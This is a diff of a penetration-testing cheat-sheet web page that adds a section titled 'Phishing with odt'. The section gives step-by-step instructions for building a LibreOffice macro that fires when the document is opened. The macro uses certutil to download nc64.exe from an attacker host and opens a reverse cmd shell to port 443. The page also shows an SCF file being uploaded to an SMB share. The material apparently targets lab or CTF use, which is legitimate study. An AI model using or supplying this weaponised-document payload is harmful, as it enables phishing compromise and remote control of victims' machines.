@@ -48,6 +48,12 @@
   
   <li><a href="https://tldrbins.github.io/@windows/">Windows</a></li>
   
+  <li><a href="https://tldrbins.github.io/@odt/">Odt</a></li>
+  
+  <li><a href="https://tldrbins.github.io/@libre/">Libre</a></li>
+  
+  <li><a href="https://tldrbins.github.io/@vba/">Vba</a></li>
+  
 </ul>
 
 <div class="content"><hr>
@@ -124,6 +130,24 @@
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># In our local Linux machine</span>
 </span></span><span class="line"><span class="cl">smbclient -N <span class="se">\\\\</span>10.10.11.10<span class="se">\\</span>share<span class="se">\\</span>
 </span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">mput evil.scf
+</span></span></code></pre></div><br>
+<hr>
+<h3 id="phishing-with-odt-open-office-format">Phishing with odt (Open Office format)</h3>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">+------------------------------------------------------+
+</span></span><span class="line"><span class="cl"><span class="p">|</span>1. <span class="s2">&#34;Tools&#34;</span> &gt; <span class="s2">&#34;Macros&#34;</span> &gt; <span class="s2">&#34;Organize Macros&#34;</span> &gt; <span class="s2">&#34;Basic...&#34;</span><span class="p">|</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span>2. <span class="s2">&#34;Untitled 1&#34;</span> &gt; <span class="s2">&#34;Standard&#34;</span> &gt; <span class="s2">&#34;New&#34;</span>                  <span class="p">|</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span>3. <span class="s2">&#34;Paste the code below&#34;</span>                             <span class="p">|</span>
+</span></span><span class="line"><span class="cl">+------------------------------------------------------+
+</span></span></code></pre></div><br>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">Sub OnLoad
+</span></span><span class="line"><span class="cl">    shell<span class="o">(</span><span class="s2">&#34;cmd /c certutil -urlcache -split -f http://10.10.14.10/nc64.exe C:\programdata\nc64.exe &amp;&amp; C:\programdata\nc64.exe -e cmd 10.10.14.10 443&#34;</span><span class="o">)</span>
+</span></span><span class="line"><span class="cl">End Sub
+</span></span></code></pre></div><br>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">+---------------------------------------------------------+
+</span></span><span class="line"><span class="cl"><span class="p">|</span>4. <span class="s2">&#34;Tools&#34;</span> &gt; <span class="s2">&#34;Organize Macros&#34;</span> &gt; <span class="s2">&#34;Basic...&#34;</span> &gt; <span class="s2">&#34;Assign...&#34;</span><span class="p">|</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span>5. <span class="s2">&#34;Events&#34;</span> &gt; <span class="s2">&#34;Open Document&#34;</span> &gt; <span class="s2">&#34;OK&#34;</span>                     <span class="p">|</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span>6. <span class="s2">&#34;SAVE&#34;</span>                                                <span class="p">|</span>
+</span></span><span class="line"><span class="cl">+---------------------------------------------------------+
 </span></span></code></pre></div><br></div></div>
     
     <script src="/js/utils.js"></script>
